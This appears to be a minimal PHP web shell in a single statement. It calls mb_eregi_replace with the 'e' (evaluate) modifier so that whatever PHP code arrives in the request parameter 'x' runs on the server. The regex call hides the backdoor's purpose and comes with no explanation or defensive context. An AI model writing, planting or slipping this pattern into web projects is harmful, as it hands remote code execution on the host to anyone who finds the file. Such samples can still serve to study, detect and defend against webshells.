<?php 
    mb_eregi_replace('\d', $_REQUEST['x'], '1', 'e');
?>
